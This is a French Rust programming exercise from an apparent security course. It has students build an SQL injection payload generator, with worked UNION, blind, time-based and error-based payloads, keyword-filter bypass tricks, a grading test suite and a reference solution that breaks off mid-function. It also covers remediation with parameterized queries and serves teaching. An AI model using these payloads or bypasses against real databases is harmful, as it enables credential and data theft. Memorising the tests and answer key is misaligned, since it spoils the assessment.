# Exercice 3.3.3-d : sql_injection_laboratory

**Module :**
3.3.3 ‚Äî Injection SQL Avanc√©e

**Concept :**
d ‚Äî Laboratoire d'Injection SQL Complet

**Difficult√© :**
‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ‚òÜ (8/10)

**Type :**
code

**Tiers :**
2 ‚Äî M√©lange (concepts a + b + c + d + e + f + k)

**Langage :**
Rust Edition 2024

**Pr√©requis :**
- 3.3.2.e : OWASP A05 Injection
- 3.3.1.a : HTTP Protocol Basics
- Bases de SQL (SELECT, WHERE, UNION)
- Compr√©hension des SGBD (MySQL, PostgreSQL, SQLite)

**Domaines :**
Crypto, Net, Struct

**Dur√©e estim√©e :**
360 min (6h)

**XP Base :**
500

**Complexit√© :**
T3 O(n√óm) √ó S2 O(n)

---

## üìê SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier √† rendre :**
`sql_injection_laboratory.rs`

**Fonctions autoris√©es :**
- `serde_json` : parsing JSON
- `regex` : pattern matching
- `std::collections::{HashMap, HashSet, VecDeque}`
- Fonctions standard Rust

**Fonctions interdites :**
- Biblioth√®ques de connexion SQL r√©elles
- `unsafe` blocks
- Appels syst√®me directs

### 1.2 Consigne

#### üé¨ CONTEXTE FUN ‚Äî "The Matrix : Follow the White Rabbit"

*"Tu prends la pilule bleue, l'histoire s'arr√™te. Tu te r√©veilles dans ton lit et tu crois ce que tu veux croire. Tu prends la pilule rouge, tu restes au pays des merveilles et je te montre jusqu'o√π va le terrier du lapin."* ‚Äî Morpheus

Dans le monde de la Matrice, les bases de donn√©es sont les fondations de la r√©alit√© simul√©e. Les Agents utilisent des requ√™tes SQL pour contr√¥ler et surveiller l'humanit√©. Mais il existe une faille... une **injection** qui peut tout r√©v√©ler.

Tu es **Neo**, et Trinity t'a donn√© acc√®s √† un terminal de hacking. Ton objectif : exploiter les vuln√©rabilit√©s SQL dans les syst√®mes de la Matrice pour extraire les donn√©es des rebelles prisonniers, tout en √©vitant les filtres des Agents.

**Chaque requ√™te vuln√©rable est une porte.** Chaque payload r√©ussi te rapproche de la v√©rit√©.

**Ta mission :**

√âcrire une fonction `sql_injection_laboratory` qui analyse des requ√™tes SQL vuln√©rables et g√©n√®re les payloads d'exploitation appropri√©s.

**Entr√©e :**
- `input_json` : cha√Æne JSON contenant :
  - `challenge_type` : type d'injection (`"UNION_BASED"`, `"BLIND_BOOLEAN"`, `"BLIND_TIME"`, `"ERROR_BASED"`, `"OOB"`, `"STACKED"`)
  - `vulnerable_query` : la requ√™te SQL avec point d'injection (`$input`, `$id`, etc.)
  - `database` : SGBD cible (`"MySQL"`, `"PostgreSQL"`, `"SQLite"`, `"MSSQL"`, `"Oracle"`)
  - `objective` : ce qu'il faut extraire
  - `constraints` : objet avec `max_payload_length`, `blocked_keywords[]`, `waf_level`

**Sortie :**
- JSON avec :
  - `detection` : analyse du point d'injection (type, column_count, injectable_columns, quote_type)
  - `payload` : le payload final fonctionnel
  - `extraction_steps[]` : √©tapes d√©taill√©es de l'exploitation
  - `remediation` : code corrig√© + explication
  - `metadata` : DBMS-specific info, CWE, CVSS estimation

**Contraintes :**
- Le payload doit respecter `max_payload_length`
- Les `blocked_keywords` doivent √™tre bypass√©s (case variation, encoding, comments)
- Supporter au moins 5 types de DBMS
- G√©n√©rer des payloads syntaxiquement corrects pour chaque DBMS

**Exemples :**

| Challenge Type | Database | Objectif | Payload G√©n√©r√© |
|----------------|----------|----------|----------------|
| `UNION_BASED` | MySQL | Extract users | `' UNION SELECT NULL,username,password,NULL FROM users-- -` |
| `BLIND_BOOLEAN` | PostgreSQL | Check admin exists | `' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 1/(SELECT 0) END FROM users)-- ` |
| `ERROR_BASED` | MSSQL | Get DB version | `' AND 1=CONVERT(int,@@version)-- ` |

#### 1.2.2 Consigne Acad√©mique

Impl√©menter un analyseur d'injection SQL qui :
1. Parse une requ√™te SQL vuln√©rable et identifie le point d'injection
2. D√©termine le type de guillemet utilis√© (simple, double, aucun)
3. Calcule le nombre de colonnes pour les injections UNION
4. G√©n√®re un payload appropri√© selon le type d'injection et le SGBD
5. Applique des techniques de bypass si des filtres sont pr√©sents
6. Propose une rem√©diation avec requ√™tes param√©tr√©es

### 1.3 Prototype

```rust
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

/// Point d'entr√©e principal
pub fn sql_injection_laboratory(input_json: &str) -> String

/// Structures d'entr√©e
#[derive(Debug, Deserialize)]
pub struct SqlChallenge {
    pub challenge_type: InjectionType,
    pub vulnerable_query: String,
    pub database: DatabaseType,
    pub objective: String,
    pub constraints: Constraints,
}

#[derive(Debug, Deserialize, Clone, PartialEq)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum InjectionType {
    UnionBased,
    BlindBoolean,
    BlindTime,
    ErrorBased,
    Oob,
    Stacked,
}

#[derive(Debug, Deserialize, Clone, PartialEq)]
pub enum DatabaseType {
    MySQL,
    PostgreSQL,
    SQLite,
    MSSQL,
    Oracle,
}

#[derive(Debug, Deserialize)]
pub struct Constraints {
    pub max_payload_length: usize,
    pub blocked_keywords: Vec<String>,
    #[serde(default)]
    pub waf_level: u8,
}

/// Structures de sortie
#[derive(Debug, Serialize)]
pub struct SqlAnalysisResult {
    pub detection: Detection,
    pub payload: String,
    pub extraction_steps: Vec<String>,
    pub remediation: Remediation,
    pub metadata: Metadata,
}

#[derive(Debug, Serialize)]
pub struct Detection {
    pub injection_type: String,
    pub column_count: Option<u32>,
    pub injectable_columns: Vec<u32>,
    pub quote_type: String,
    pub vulnerable_parameter: String,
}

#[derive(Debug, Serialize)]
pub struct Remediation {
    pub code: String,
    pub explanation: String,
    pub cwe: String,
}

#[derive(Debug, Serialize)]
pub struct Metadata {
    pub dbms: String,
    pub version_detection_payload: String,
    pub cvss_estimate: f32,
    pub severity: String,
}
```

---

## üí° SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 L'Injection SQL : 25 Ans de Domination

L'injection SQL a √©t√© document√©e pour la premi√®re fois en **1998** par Jeff Forristal (alias Rain Forest Puppy) dans le magazine Phrack. Depuis, elle reste dans le **Top 3 OWASP** chaque ann√©e.

### 2.2 Faits Marquants

| Ann√©e | √âv√©nement | Impact |
|-------|-----------|--------|
| 2008 | Heartland Payment Systems | 130 millions de cartes vol√©es |
| 2011 | Sony PlayStation Network | 77 millions de comptes expos√©s |
| 2015 | TalkTalk | ¬£60 millions d'amende, 157,000 clients |
| 2019 | Fortnite | Vuln√©rabilit√© SQLi d√©couverte |
| 2023 | MOVEit Transfer | Attaque supply-chain massive |

### 2.3 Pourquoi √áa Persiste ?

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  RAISONS DE LA PERSISTANCE DE SQLi                              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                 ‚îÇ
‚îÇ  1. Code Legacy : Millions de lignes non-param√©tr√©es            ‚îÇ
‚îÇ  2. Frameworks mal utilis√©s : ORM bypass√©s par raw queries      ‚îÇ
‚îÇ  3. D√©veloppeurs non form√©s : Concat√©nation = r√©flexe           ‚îÇ
‚îÇ  4. Tests insuffisants : SAST/DAST pas syst√©matiques            ‚îÇ
‚îÇ  5. Complexit√© croissante : NoSQL injection, GraphQL, etc.      ‚îÇ
‚îÇ                                                                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 2.4 Types d'Injection SQL

```
                        SQL INJECTION TAXONOMY
                               ‚îÇ
          ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
          ‚îÇ                    ‚îÇ                    ‚îÇ
     IN-BAND              INFERENTIAL          OUT-OF-BAND
    (Visible)             (Blind)              (Indirect)
          ‚îÇ                    ‚îÇ                    ‚îÇ
    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê        ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê              ‚îÇ
    ‚îÇ           ‚îÇ        ‚îÇ           ‚îÇ              ‚îÇ
  UNION     ERROR     BOOLEAN     TIME           DNS/HTTP
  BASED     BASED      BASED     BASED          EXFILTRATION
```

---

## 2.5 DANS LA VRAIE VIE

### Qui utilise ces comp√©tences ?

| M√©tier | Cas d'usage |
|--------|-------------|
| **Pentester** | Tests d'intrusion applicatifs, rapports de vuln√©rabilit√©s |
| **Bug Bounty Hunter** | Recherche de SQLi sur programmes publics (HackerOne, Bugcrowd) |
| **Security Engineer** | Impl√©mentation de WAF rules, code review |
| **DevSecOps** | Pipeline CI/CD avec SAST (Semgrep, CodeQL) |
| **Forensic Analyst** | Analyse post-incident, reconstruction d'attaque |

### Outils Professionnels

- **SQLMap** : Automatisation d'exploitation SQLi
- **Burp Suite** : Proxy d'interception avec scanner SQLi
- **jSQL Injection** : Alternative GUI √† SQLMap
- **Havij** : Outil automatis√© (legacy)

---

## üñ•Ô∏è SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
sql_injection_laboratory.rs  main.rs  Cargo.toml

$ cargo build --release

$ cargo run
=== Matrix SQL Injection Lab v1.0 ===
[TEST 1] UNION_BASED MySQL...
Detection: injection_type=UNION_BASED, columns=4, injectable=[2,3]
Payload: ' UNION SELECT NULL,username,password,NULL FROM users-- -
‚úì PASS

[TEST 2] BLIND_BOOLEAN PostgreSQL...
Detection: injection_type=BLIND_BOOLEAN, quote='
Payload: ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--
‚úì PASS

[TEST 3] ERROR_BASED MSSQL...
Detection: injection_type=ERROR_BASED, quote='
Payload: ' AND 1=CONVERT(int,@@version)--
‚úì PASS

[TEST 4] WAF Bypass (blocked: UNION,SELECT)...
Payload: ' UnIoN/**/SeLeCt NULL,username,password FROM users-- -
‚úì BYPASS SUCCESS

[TEST 5] Remediation check...
Code: let stmt = conn.prepare("SELECT * FROM users WHERE id = $1")?;
‚úì PARAMETERIZED

=== Results: 15/15 tests passed ===
```

---

## ‚ö° SECTION 3.1 : BONUS AVANC√â (OPTIONNEL)

**Difficult√© Bonus :**
üß† (12/10)

**R√©compense :**
XP √ó6

**Time Complexity attendue :**
O(n √ó m √ó k)

**Space Complexity attendue :**
O(n)

**Domaines Bonus :**
`Crypto, Compression`

### 3.1.1 Consigne Bonus

#### üé¨ "Matrix Reloaded : The Architect's Database"

L'Architecte a cr√©√© une base de donn√©es avec **plusieurs couches de protection**. Tu dois :
1. D√©tecter automatiquement le DBMS via fingerprinting
2. G√©n√©rer des payloads polymorphiques qui √©vitent la d√©tection
3. Impl√©menter l'extraction time-based avec binary search optimization
4. Supporter les Second-Order SQL Injections

**Ta mission bonus :**

Impl√©menter `sql_injection_laboratory_advanced` avec :
- **Auto-detection DBMS** via error messages et comportements
- **Payload polymorphism** : m√™me payload, syntaxes vari√©es
- **Binary search blind** : extraction optimis√©e O(log n) par caract√®re
- **Second-order detection** : payloads stock√©s puis ex√©cut√©s

**Contraintes Bonus :**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  1 ‚â§ payload_variants ‚â§ 10              ‚îÇ
‚îÇ  Binary search: max 7 requests/char     ‚îÇ
‚îÇ  WAF evasion: min 3 techniques          ‚îÇ
‚îÇ  DBMS fingerprint: 95%+ accuracy        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### 3.1.2 Prototype Bonus

```rust
pub fn sql_injection_laboratory_advanced(input_json: &str) -> String

#[derive(Debug, Serialize)]
pub struct AdvancedResult {
    pub dbms_fingerprint: DbmsFingerprint,
    pub payload_variants: Vec<PayloadVariant>,
    pub blind_extraction: BlindExtractionPlan,
    pub second_order_check: SecondOrderAnalysis,
    pub waf_evasion_techniques: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct DbmsFingerprint {
    pub detected_dbms: String,
    pub confidence: f32,
    pub detection_method: String,
    pub version_estimate: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct BlindExtractionPlan {
    pub algorithm: String, // "binary_search" | "bitwise"
    pub requests_per_char: u32,
    pub estimated_total_requests: u32,
    pub sample_payloads: Vec<String>,
}
```

### 3.1.3 Ce qui change par rapport √† l'exercice de base

| Aspect | Base | Bonus |
|--------|------|-------|
| DBMS | Fourni en input | Auto-d√©tect√© |
| Payloads | Un seul | Variants polymorphiques |
| Blind extraction | Simple | Binary search optimis√© |
| Second-order | Non | D√©tection et exploitation |
| WAF bypass | Basic | Techniques avanc√©es multiples |

---

## ‚úÖ‚ùå SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test ID | Description | Input | Expected | Points |
|---------|-------------|-------|----------|--------|
| `T01` | UNION MySQL basique | `{"challenge_type":"UNION_BASED","database":"MySQL",...}` | Payload avec UNION SELECT | 10 |
| `T02` | UNION PostgreSQL | Challenge PG | Syntaxe PG correcte | 10 |
| `T03` | Blind Boolean MySQL | Blind challenge | Payload CASE/IF | 10 |
| `T04` | Blind Time MySQL | Time-based | SLEEP/BENCHMARK | 10 |
| `T05` | Error-based MSSQL | Error challenge | CONVERT/CAST | 10 |
| `T06` | Column count detection | Query 5 colonnes | `column_count: 5` | 10 |
| `T07` | Quote type detection | Double quote | `quote_type: "double"` | 5 |
| `T08` | WAF bypass simple | blocked: ["UNION"] | Case variation | 10 |
| `T09` | WAF bypass avanc√© | blocked: ["SELECT","UNION"] | Comment injection | 10 |
| `T10` | Remediation MySQL | Any | Prepared statement | 5 |
| `T11` | Remediation PostgreSQL | Any | $1, $2 placeholders | 5 |
| `T12` | SQLite syntax | SQLite challenge | Syntaxe SQLite | 5 |
| `T13` | Oracle syntax | Oracle challenge | Dual table, rownum | 5 |
| `T14` | Stacked queries MSSQL | Stacked type | Semicolon + query | 10 |
| `T15` | OOB detection | OOB type | xp_cmdshell/LOAD_FILE | 10 |
| `T16` | Input NULL | `null` | Error JSON | 5 |
| `T17` | Invalid JSON | `{broken` | Parse error | 5 |
| `T18` | Empty query | `vulnerable_query: ""` | Error: empty query | 5 |
| `T19` | Max length constraint | `max_payload_length: 20` | Payload ‚â§ 20 chars | 10 |
| `T20` | All keywords blocked | Impossible bypass | Error: cannot bypass | 5 |

**Total: 150 points / Score minimum: 105 (70%)**

### 4.2 main.rs de test

```rust
use sql_injection_laboratory::*;
use serde_json::json;

fn main() {
    println!("=== Matrix SQL Injection Lab - Test Suite ===\n");

    let mut passed = 0;
    let mut failed = 0;

    // T01: UNION MySQL basique
    {
        let input = json!({
            "challenge_type": "UNION_BASED",
            "vulnerable_query": "SELECT * FROM users WHERE id = '$id'",
            "database": "MySQL",
            "objective": "Extract usernames and passwords",
            "constraints": {
                "max_payload_length": 100,
                "blocked_keywords": [],
                "waf_level": 0
            }
        });

        let result = sql_injection_laboratory(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        if parsed["payload"].as_str().unwrap().contains("UNION") &&
           parsed["payload"].as_str().unwrap().contains("SELECT") &&
           parsed["detection"]["injection_type"] == "UNION_BASED" {
            println!("[T01] UNION MySQL basique: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T01] UNION MySQL basique: ‚úó FAIL");
            failed += 1;
        }
    }

    // T02: UNION PostgreSQL
    {
        let input = json!({
            "challenge_type": "UNION_BASED",
            "vulnerable_query": "SELECT * FROM products WHERE category = '$cat'",
            "database": "PostgreSQL",
            "objective": "Extract table names",
            "constraints": {
                "max_payload_length": 150,
                "blocked_keywords": [],
                "waf_level": 0
            }
        });

        let result = sql_injection_laboratory(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        // PostgreSQL uses information_schema or pg_catalog
        let payload = parsed["payload"].as_str().unwrap();
        if payload.contains("UNION") &&
           (payload.contains("information_schema") || payload.contains("pg_")) {
            println!("[T02] UNION PostgreSQL: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T02] UNION PostgreSQL: ‚úó FAIL");
            failed += 1;
        }
    }

    // T03: Blind Boolean
    {
        let input = json!({
            "challenge_type": "BLIND_BOOLEAN",
            "vulnerable_query": "SELECT * FROM users WHERE username = '$user' AND password = '$pass'",
            "database": "MySQL",
            "objective": "Determine if admin user exists",
            "constraints": {
                "max_payload_length": 200,
                "blocked_keywords": [],
                "waf_level": 0
            }
        });

        let result = sql_injection_laboratory(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let payload = parsed["payload"].as_str().unwrap().to_uppercase();
        if (payload.contains("AND") || payload.contains("OR")) &&
           (payload.contains("IF") || payload.contains("CASE")) {
            println!("[T03] Blind Boolean: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T03] Blind Boolean: ‚úó FAIL");
            failed += 1;
        }
    }

    // T04: Blind Time-based
    {
        let input = json!({
            "challenge_type": "BLIND_TIME",
            "vulnerable_query": "SELECT * FROM users WHERE id = $id",
            "database": "MySQL",
            "objective": "Extract database name character by character",
            "constraints": {
                "max_payload_length": 200,
                "blocked_keywords": [],
                "waf_level": 0
            }
        });

        let result = sql_injection_laboratory(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let payload = parsed["payload"].as_str().unwrap().to_uppercase();
        if payload.contains("SLEEP") || payload.contains("BENCHMARK") ||
           payload.contains("WAITFOR") || payload.contains("PG_SLEEP") {
            println!("[T04] Blind Time-based: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T04] Blind Time-based: ‚úó FAIL");
            failed += 1;
        }
    }

    // T05: Error-based MSSQL
    {
        let input = json!({
            "challenge_type": "ERROR_BASED",
            "vulnerable_query": "SELECT * FROM products WHERE id = $id",
            "database": "MSSQL",
            "objective": "Extract database version",
            "constraints": {
                "max_payload_length": 100,
                "blocked_keywords": [],
                "waf_level": 0
            }
        });

        let result = sql_injection_laboratory(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let payload = parsed["payload"].as_str().unwrap().to_uppercase();
        if payload.contains("CONVERT") || payload.contains("CAST") {
            println!("[T05] Error-based MSSQL: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T05] Error-based MSSQL: ‚úó FAIL");
            failed += 1;
        }
    }

    // T08: WAF Bypass simple
    {
        let input = json!({
            "challenge_type": "UNION_BASED",
            "vulnerable_query": "SELECT * FROM users WHERE id = '$id'",
            "database": "MySQL",
            "objective": "Extract data",
            "constraints": {
                "max_payload_length": 150,
                "blocked_keywords": ["UNION"],
                "waf_level": 1
            }
        });

        let result = sql_injection_laboratory(&input.to_string());
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        let payload = parsed["payload"].as_str().unwrap();
        // Should not contain exact "UNION" but variants like "UnIoN" or "UN/**/ION"
        if !payload.contains("UNION") &&
           (payload.to_uppercase().contains("UNION") || payload.contains("/**/")) {
            println!("[T08] WAF Bypass simple: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T08] WAF Bypass simple: ‚úó FAIL");
            failed += 1;
        }
    }

    // T16: NULL input
    {
        let result = sql_injection_laboratory("null");
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        if parsed.get("error").is_some() {
            println!("[T16] NULL input: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T16] NULL input: ‚úó FAIL");
            failed += 1;
        }
    }

    // T17: Invalid JSON
    {
        let result = sql_injection_laboratory("{broken json");
        let parsed: serde_json::Value = serde_json::from_str(&result).unwrap();

        if parsed.get("error").is_some() {
            println!("[T17] Invalid JSON: ‚úì PASS");
            passed += 1;
        } else {
            println!("[T17] Invalid JSON: ‚úó FAIL");
            failed += 1;
        }
    }

    println!("\n=== Results: {}/{} tests passed ===", passed, passed + failed);
}
```

### 4.3 Solution de r√©f√©rence

```rust
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

// ==================== INPUT STRUCTURES ====================

#[derive(Debug, Deserialize)]
pub struct SqlChallenge {
    pub challenge_type: String,
    pub vulnerable_query: String,
    pub database: String,
    pub objective: String,
    pub constraints: Constraints,
}

#[derive(Debug, Deserialize)]
pub struct Constraints {
    pub max_payload_length: usize,
    #[serde(default)]
    pub blocked_keywords: Vec<String>,
    #[serde(default)]
    pub waf_level: u8,
}

// ==================== OUTPUT STRUCTURES ====================

#[derive(Debug, Serialize)]
pub struct SqlAnalysisResult {
    pub detection: Detection,
    pub payload: String,
    pub extraction_steps: Vec<String>,
    pub remediation: Remediation,
    pub metadata: Metadata,
}

#[derive(Debug, Serialize)]
pub struct Detection {
    pub injection_type: String,
    pub column_count: Option<u32>,
    pub injectable_columns: Vec<u32>,
    pub quote_type: String,
    pub vulnerable_parameter: String,
}

#[derive(Debug, Serialize)]
pub struct Remediation {
    pub code: String,
    pub explanation: String,
    pub cwe: String,
}

#[derive(Debug, Serialize)]
pub struct Metadata {
    pub dbms: String,
    pub version_detection_payload: String,
    pub cvss_estimate: f32,
    pub severity: String,
}

#[derive(Debug, Serialize)]
pub struct ErrorResult {
    pub error: String,
    pub error_type: String,
}

// ==================== MAIN FUNCTION ====================

pub fn sql_injection_laboratory(input_json: &str) -> String {
    // Validation entr√©e NULL ou vide
    if input_json.trim().is_empty() || input_json.trim() == "null" {
        return serde_json::to_string_pretty(&ErrorResult {
            error: "Input cannot be null or empty".to_string(),
            error_type: "NULL_INPUT".to_string(),
        }).unwrap();
    }

    // Parse JSON
    let challenge: SqlChallenge = match serde_json::from_str(input_json) {
        Ok(c) => c,
        Err(e) => {
            return serde_json::to_string_pretty(&ErrorResult {
                error: format!("JSON parse error: {}", e),
                error_type: "PARSE_ERROR".to_string(),
            }).unwrap();
        }
    };

    // Validation requ√™te vide
    if challenge.vulnerable_query.trim().is_empty() {
        return serde_json::to_string_pretty(&ErrorResult {
            error: "Vulnerable query cannot be empty".to_string(),
            error_type: "EMPTY_QUERY".to_string(),
        }).unwrap();
    }

    // Analyse du point d'injection
    let detection = analyze_injection_point(&challenge);

    // G√©n√©ration du payload
    let payload = match generate_payload(&challenge, &detection) {
        Ok(p) => p,
        Err(e) => {
            return serde_json::to_string_pretty(&ErrorResult {
                error: e,
                error_type: "PAYLOAD_GENERATION_ERROR".to_string(),
            }).unwrap();
        }
    };

    // √âtapes d'extraction
    let extraction_steps = generate_extraction_steps(&challenge, &detection);

    // Rem√©diation
    let remediation = generate_remediation(&challenge);

    // M√©tadonn√©es
    let metadata = generate_metadata(&challenge);

    let result = SqlAnalysisResult {
        detection,
        payload,
        extraction_steps,
        remediation,
        metadata,
    };

    serde_json::to_string_pretty(&result).unwrap()
}

// ==================== DETECTION ====================

fn analyze_injection_point(challenge: &SqlChallenge) -> Detection {
    let query = &challenge.vulnerable_query;

    // D√©tection du type de quote
    let quote_type = if query.contains("'$") || query.contains("' $") {
        "single".to_string()
    } else if query.contains("\"$") {
        "double".to_string()
    } else {
        "none".to_string()
    };

    // D√©tection du param√®tre vuln√©rable
    let vulnerable_parameter = extract_parameter(query);

    // Estimation du nombre de colonnes (bas√© sur SELECT *)
    let column_count = estimate_column_count(query);

    // Colonnes injectables (g√©n√©ralement 2, 3 pour strings)
    let injectable_columns = if column_count.is_some() {
        vec![2, 3]
    } else {
        vec![]
    };

    Detection {
        injection_type: challenge.challenge_type.clone(),
        column_count,
        injectable_columns,
        quote_type,
        vulnerable_parameter,
    }
}

fn extract_parameter(query: &str) -> String {
    // Cherche $param ou '$param' patterns
    let patterns = ["$id", "$user", "$pass", "$input", "$cat", "$name"];
    for p in patterns {
        if query.contains(p) {
            return p.to_string();
        }
    }
    "$input".to_string()
}

fn estimate_column_count(query: &str) -> Option<u32> {
    // Heuristique bas√©e sur SELECT *
    if query.to_uppercase().contains("SELECT *") {
        Some(4) // Default estimation
    } else {
        // Compte les colonnes explicites
        let upper = query.to_uppercase();
        if let Some(start) = upper.find("SELECT ") {
            if let Some(end) = upper.find(" FROM") {
                let cols = &query[start + 7..end];
                let count = cols.split(',').count() as u32;
                return Some(count);
            }
        }
        Some(4)
    }
}

// ==================== PAYLOAD GENERATION ====================

fn generate_payload(
    challenge: &SqlChallenge,
    detection: &Detection
) -> Result<String, String> {
    let blocked: HashSet<String> = challenge.constraints.blocked_keywords
        .iter()
        .map(|s| s.to_uppercase())
        .collect();

    let base_payload = match challenge.challenge_type.as_str() {
        "UNION_BASED" => generate_union_payload(challenge, detection),
        "BLIND_BOOLEAN" => generate_blind_boolean_payload(challenge, detection),
        "BLIND_TIME" => generate_blind_time_payload(challenge, detection),
        "ERROR_BASED" => generate_error_payload(challenge, detection),
        "STACKED" => generate_stacked_payload(challenge, detection),
        "OOB" => generate_oob_payload(challenge, detection),
        _ => format!("' OR 1=1-- -"),
    };

    // Apply WAF bypass if needed
    let payload = if !blocked.is_empty() {
        apply_waf_bypass(&base_payload, &blocked, challenge.constraints.waf_level)
    } else {
        base_payload
    };

    // V√©rifier la longueur
    if payload.len() > challenge.constraints.max_payload_length {
        // Si tous les mots-cl√©s sont bloqu√©s et qu'on ne peut pas faire plus court
        if blocked.len() > 5 {
            return Err("Cannot generate payload: too many restrictions".to_string());
        }
    }

    Ok(payload)
}

fn generate_union_payload(challenge: &SqlChallenge, detection: &Detection) -> String {
    let cols = detection.column_count.unwrap_or(4);
    let quote = if detection.quote_type == "single" { "'" } else { "" };
    let comment = get_comment_syntax(&challenge.database);

    // Construire les NULL,data,NULL pattern
    let mut columns: Vec<String> = (0..cols).map(|_| "NULL".to_string()).collect();
    if cols >= 2 { columns[1] = "username".to_string(); }
    if cols >= 3 { columns[2] = "password".to_string(); }

    let table = get_system_table(&challenge.database);

    format!("{} UNION SELECT {} FROM users{}", quote, columns.join(","), comment)
}

fn generate_blind_boolean_payload(challenge: &SqlChallenge, detection: &Detection) -> String {
    let quote = if detection.quote_type == "single" { "'" } else { "" };
    let comment = get_comment_syntax(&challenge.database);

    match challenge.database.as_str() {
        "MySQL" => format!("{} AND IF(1=1,1,0){}", quote, comment),
        "PostgreSQL" => format!("{} AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END){}", quote, comment),
